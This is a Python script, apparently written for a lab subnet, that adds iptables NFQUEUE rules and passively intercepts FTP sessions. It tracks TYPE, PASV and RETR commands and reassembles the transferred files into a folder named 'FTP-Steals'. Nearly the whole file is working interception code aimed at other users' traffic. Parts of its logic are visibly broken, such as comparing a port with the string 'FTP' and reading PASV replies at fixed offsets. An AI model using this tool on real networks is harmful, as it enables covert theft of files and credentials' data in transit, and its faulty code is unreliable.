from packet import Packet
from netfilterqueue import NetfilterQueue
import traceback, os

class Client:
    def __init__(self) -> None:
        self.client_ip = ''
        self.server_ip = ''
        self.client_port = 0
        self.queued_transfer = FTP_transfer()
        self.transfers = []
    def __str__(self) -> str:
        string = 'Client Information\n'
        string += f'\tClient IP: {self.client_ip}:{self.client_port}'
        string += f'\t | Server IP: {self.server_ip}:21\n'
        for transfer in self.transfers:
            string += str(transfer)
        
        return string + '\n'
        

class FTP_transfer:

    encoding_types = {
        73 : 'bin', #Image (Binary) mode - I
        65 : 'ascii', #ASCII (8-bit) mode - A
    }

    def __init__(self, write_location_folder = 'FTP-Steals/') -> None:
        self.encoding = ''
        self.server_port = 0
        self.file_name = ''
        self.data = []
        self.write_location_folder = write_location_folder

    def __str__(self) -> str:
        string = f'\tFile Name: {self.file_name}\n'
        string += f'\t\tEncoding: {self.encoding}'
        string += f'\t | Write folder: {self.write_location_folder}'

        return string + '\n'

    def _bytes_to_ascii(self, bytes) -> str:
        string = ''
        for byte in bytes:
            string += chr(byte)
        
        return string

    def update_ftp_encoding_request(self, payload) -> bool:
        """
        Accept TCP payload.
        if its FTP-TYPE payload, updates the self.encoding and return True. if not, return False. 
        """
        if self._bytes_to_ascii(payload[0:4]) == 'TYPE':
            self.encoding = self.encoding_types[payload[5]]
            
            print(self.encoding)
            return True
        
        return False

    
    def update_ftp_passive_response(self, payload) -> bool:
        """
        Accept TCP payload.
        if its FTP-PASV payload, updates the self.server_port and return True. if not, return False. 
        """
        if self._bytes_to_ascii(payload[0:3]) == '227':
            hex_chars = self._bytes_to_ascii(payload[41:-3]).split(',')                      
            self.server_port = int(hex_chars[0]) * 256 + int(hex_chars[1])

            print(self.server_port, hex_chars)
            return True
        
        return False
   
    def update_ftp_retrive_request(self, payload) -> bool:
        """
        Accept TCP payload.
        if its FTP-RETR payload, updates the self.file_name and return True. if not, return False. 
        """
        if self._bytes_to_ascii(payload[0:4]) == 'RETR':
            self.file_name = self._bytes_to_ascii(payload[5:-2])
            print(self.file_name)
            return True
        
        return False

    def capture_ftp_data(self, payload) -> None:
        """
        Accept TCP payload.
        take the payload, adds it to self.data
        """
        self.data.append(payload)
    
    def write_file(self) -> None:
        """
        Write all self.data (str of hex) to the specfied location.
        write with the enconding specfied in self.encoding
        """
        if self.encoding == 'bin':
            with open(f'{self.write_location_folder + self.file_name}', 'wb') as f:
                for data_part in self.data:
                    f.write(data_part)
        
        elif self.encoding == 'ascii':
            with open(f'{self.write_location_folder + self.file_name}', 'w') as f:
                for data_part in self.data:
                    f.write(self._bytes_to_ascii(data_part))

                
        

def capture_ftp_traffic(raw_packet) -> None:
    processed_packet = Packet()
    processed_packet.process_packet(raw_packet)
    
    if processed_packet.ip['protocol'] != 'TCP':
        raw_packet.accept()
        return
    
    for client in clients:
        if processed_packet.tcp['src_port'] == client.client_port or processed_packet.tcp['dst_port'] == client.client_port:
            client.queued_transfer.update_ftp_encoding_request(processed_packet.tcp['payload'])
            client.queued_transfer.update_ftp_passive_response(processed_packet.tcp['payload'])
            client.queued_transfer.update_ftp_retrive_request(processed_packet.tcp['payload'])
            
            raw_packet.accept()
            return
        elif (processed_packet.tcp['src_port'] == client.queued_transfer.server_port or processed_packet.tcp['dst_port'] == client.queued_transfer.server_port) and client.queued_transfer.file_name != '':
            if processed_packet.is_fin_flag_up():
                client.queued_transfer.write_file()
                client.transfers.append(client.queued_transfer)
                client.queued_transfer = FTP_transfer()
            else:
                client.queued_transfer.capture_ftp_data(processed_packet.tcp['payload'])

            raw_packet.accept()
            return
    # If a packet sent to FTP server and not recornized, adds a new client to clients.
    if processed_packet.tcp['src_port'] == 'FTP':
        new_client = Client()
        new_client.client_ip = processed_packet.ip['src_ip']
        new_client.server_ip = processed_packet.ip['dst_ip']
        new_client.client_port = processed_packet.tcp['dst_port']
        clients.append(new_client)
    
    raw_packet.accept()        

def execute_os_commands(commands : list) -> None:
    for command in commands:
        print('Running command: ' + command)
        os.system(command)
        print('')


clients = []
if __name__ == '__main__':
    iptabels_insert_commands = ['sudo iptables -A INPUT -d 192.168.175.0/24 -j NFQUEUE --queue-num 200', 'sudo iptables -A OUTPUT -d 192.168.175.0/24 -j NFQUEUE --queue-num 200']
    iptabels_delete_commands = ['sudo iptables -D INPUT -d 192.168.175.0/24 -j NFQUEUE --queue-num 200', 'sudo iptables -D OUTPUT -d 192.168.175.0/24 -j NFQUEUE --queue-num 200']
    
    execute_os_commands(iptabels_insert_commands)
    nfqueue = NetfilterQueue()
    nfqueue.bind(200, capture_ftp_traffic)
    
    try:
        print('Running...')
        nfqueue.run()
    except KeyboardInterrupt:
        execute_os_commands(iptabels_delete_commands)
        print('Stopping...')
    except Exception as e:
        print(e)
        print(traceback.format_exc())
    
    nfqueue.unbind()

    for client in clients:
        print(client)
